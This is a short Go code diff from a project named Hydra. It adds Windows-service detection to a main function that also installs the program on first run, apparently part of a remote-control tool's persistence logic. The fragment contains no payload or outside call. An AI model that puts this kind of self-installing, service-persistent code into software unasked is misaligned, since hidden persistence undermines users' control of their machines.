@@ -6,9 +6,13 @@ import (
 	"github.com/Raffy27/Hydra/api"
 	"github.com/Raffy27/Hydra/commands"
 	"github.com/Raffy27/Hydra/install"
+	"golang.org/x/sys/windows/svc"
 )
 
 func main() {
+	if chk, _ := svc.IsWindowsService(); chk {
+		install.HandleService()
+	}
 	if !install.IsInstalled() {
 		install.Install()
 		log.Println("Install successful")
